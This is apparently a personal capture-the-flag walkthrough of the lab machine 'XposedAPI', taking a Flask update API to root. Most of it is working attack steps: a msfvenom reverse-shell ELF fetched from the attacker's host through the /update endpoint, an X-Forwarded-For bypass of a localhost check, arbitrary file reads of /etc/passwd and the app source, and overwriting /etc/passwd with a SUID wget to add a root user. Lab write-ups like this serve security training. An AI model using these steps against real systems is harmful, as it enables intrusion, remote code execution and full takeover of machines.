---
date created: 2023-09-18 23:07
---

# XposedAPI - 192.168.214.134


### Nmap Scan

```shell
nmap -sS -sV -sC --open -p- $IP
```

```shell
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
13337/tcp open  http    Gunicorn 20.0.4
|_http-title: Remote Software Management API
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Initial Access

- Lets probe out the http server
```shell
http://192.168.214.134:13337/

/
Methods: GET
Returns this page.

/version
Methods: GET
Returns version of the app running.

/update
Methods: POST
Updates the app from ELF file. Content-Type: application/json {"user":"<user requesting the update>", "url":"<url of the update to download>"}

/logs
Methods: GET
Read log files.

/restart
Methods: GET
To request the restart of the app.

```

- Our vector is seems clear, use the /update endpoint and post a binary file with our reverse shell hosted on the url.

```shell
msfvenom -p linux/x84/shell_reverse_tcp LHOST=192.168.45.215 LPORT=4444 -f elf > shell.elf
```

```http
POST /update HTTP/1.1

Host: 192.168.214.134:13337

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Content-Type: application/json

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

Content-Length: 69



{"user":"admin", "url":"http://192.168.45.215:8000/shells/shell.elf"}
```

- Accessing the /logs endpoint identifies an error message **WAF: Access Denied for this Host**
- We can assume this is restricting access to localhost
- So we need to modify our request to appear if its coming from internally

<https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Forwarded>

For this purpose we should look at **client origin** headers.

```
X-Forwarded-Host
X-Forwarded-For
X-Frame-Options
X-Content-Type-Options
X-XSS-Protection
Set-Cookie
```

![image](https://github.com/1Gould/Proving-Grounds/assets/7574362/49f89f3d-7bdb-4a3b-ba65-b2204e175dd0)


```shell
X-Forwarded-For: 127.0.0.1
```

Now let's add the file path and try to gain a valid username.

```http
GET /logs?file=/etc/passwd HTTP/1.1

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

X-Forwarded-For: 127.0.0.1

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1
```

![image](https://github.com/1Gould/Proving-Grounds/assets/7574362/08e65256-60fe-4ffc-b6af-b51d10961531)

`clumsyadmin`

Now let's relaunch our payload with the username and try to get a reverse shell.

```json
{"user":"clumsyadmin", "url":"http://192.168.45.215:8000/shells/shell.elf"}
```

From the output of the python server we can see that the application is retrieving the payload but we aren't getting a reverse shell back.

Let's retrieve the location of the server files from the LFI and diagnose our error.

- /proc/self/cmdline
- /proc/self/environ

```shell
/usr/bin/python3/usr/local/gunicorn-w4-b0.0.0.0:1337main:app
```

![image](https://github.com/1Gould/Proving-Grounds/assets/7574362/874c8f2e-93b7-40e6-a1ea-e31cee1ab3d9)


- `/home/clumsyadmin/webapp`

```shell
curl -H "X-Forwarded-For: 127.0.0.1" http://192.168.245.134:13337/logs?file=/home/clumsyadmin/webapp/main.py -o main.py
```

```python
#!/usr/bin/env python3
from flask import Flask, jsonify, request, render_template, Response
from Crypto.Hash import MD5
import json, os, binascii
app = Flask(__name__)

@app.route(&#39;/&#39;)
def home():
    return(render_template(&#34;home.html&#34;))

@app.route(&#39;/update&#39;, methods = [&#34;POST&#34;])
def update():
    if request.headers[&#39;Content-Type&#39;] != &#34;application/json&#34;:
        return(&#34;Invalid content type.&#34;)
    else:
        data = json.loads(request.data)
        if data[&#39;user&#39;] != &#34;clumsyadmin&#34;:
            return(&#34;Invalid username.&#34;)
        else:
            os.system(&#34;curl {} -o /home/clumsyadmin/app&#34;.format(data[&#39;url&#39;]))
            return(&#34;Update requested by {}. Restart the software for changes to take effect.&#34;.format(data[&#39;user&#39;]))

@app.route(&#39;/logs&#39;)
def readlogs():
  if request.headers.getlist(&#34;X-Forwarded-For&#34;):
        ip = request.headers.getlist(&#34;X-Forwarded-For&#34;)[0]
  else:
        ip = &#34;1.3.3.7&#34;
  if ip == &#34;localhost&#34; or ip == &#34;127.0.0.1&#34;:
    if request.args.get(&#34;file&#34;) == None:
        return(&#34;Error! No file specified. Use file=/path/to/log/file to access log files.&#34;, 404)
    else:
        data = &#39;&#39;
        with open(request.args.get(&#34;file&#34;), &#39;r&#39;) as f:
            data = f.read()
            f.close()
        return(render_template(&#34;logs.html&#34;, data=data))
  else:
       return(&#34;WAF: Access Denied for this Host.&#34;,403)

@app.route(&#39;/version&#39;)
def version():
    hasher = MD5.new()
    appHash = &#39;&#39;
    with open(&#34;/home/clumsyadmin/app&#34;, &#39;rb&#39;) as f:
        d = f.read()
        hasher.update(d)
        appHash = binascii.hexlify(hasher.digest()).decode()
    return(&#34;1.0.0b{}&#34;.format(appHash))

@app.route(&#39;/restart&#39;, methods = [&#34;GET&#34;, &#34;POST&#34;])
def restart():
    if request.method == &#34;GET&#34;:
        return(render_template(&#34;restart.html&#34;))
    else:
        os.system(&#34;killall app&#34;)
        os.system(&#34;bash -c &#39;/home/clumsyadmin/app&&#39;&#34;)
        return(&#34;Restart Successful.&#34;)
```

```shell
os.system("bash -c '/home/clumsyadmin/app&'") 
```

We can see under the restart function that the system makes a call to the `app` file, lets rename our payload and try to run it again.

```shell
cp shell.elf > app

curl -v -X POST -d '{"user":"clumsyadmin", "url":"http://192.168.45.215:8000/shells/app"}' -H "Content-Type: application/json" -H "X-Forwarded-For: localhost" http://192.168.245.134:13337/update
```

```http
POST /update HTTP/1.1

Host: 192.168.214.134:13337

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

X-Forwarded-For: localhost

Content-Type: application/json

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

Content-Length: 69



{"user":"clumsyadmin", "url":"http://192.168.45.215:8000/shells/app"}
```

Restarting the application didn't seem to connect back again, lets curl the restart endpoint and see whats happening.

```shell
curl http://192.168.214.134:13337/restart -H "X-Forwarded-For: localhost"

<html>
    <head>
        <title>Remote Service Software Management API</title>
        <script>
            function restart(){
                if(confirm("Do you really want to restart the app?")){
                    var x = new XMLHttpRequest();
                    x.open("POST", document.URL.toString());
                    x.send('{"confirm":"true"}');
                    window.location.assign(window.location.origin.toString());
                }
            }
        </script>
    </head>
    <body>
    <script>restart()</script>
    </body>
</html>
```

It expects a POST request so let's try that.

```shell
curl -v -X POST -H "X-Forwarded-For: localhost" http://192.168.214.134/restart
```

![image](https://github.com/1Gould/Proving-Grounds/assets/7574362/7a1b0104-7f40-4f97-8c95-8d0437c629dc)


## Priv Esc

Lets see what tools we have available and try to upgrade our shell. I like to check the location and permissions of some common ones.

```shell
ls -al $(which python)
ls -al $(which wget)
ls -al $(which nc)
ls -al $(which curl)
```

Interestingly, wget has its SUID bit set. Lets confirm this again with the usual SUID search command.

```shell
find / -perm -u=s -type f 2>/dev/null
```

This will allow us to overwrite files, lets overwrite **/etc/passwd**.

Lets copy the file to our local machine and add a user to it with root privileges, then use wget to retrieve the file and overwrite.

```shell
openssl passwd -1 -salt test test
echo 'test:$1$test$pi/xDtU5WFVRqYS6BMU8X/:0:0:root:/root:/bin/bash' >> passwd

# On Victim
wget http://192.168.45.215:8000/passwd -O /etc/passwd
```

![image](https://github.com/1Gould/Proving-Grounds/assets/7574362/0583dcac-c0a6-46ff-b8a8-57bba33213a1)
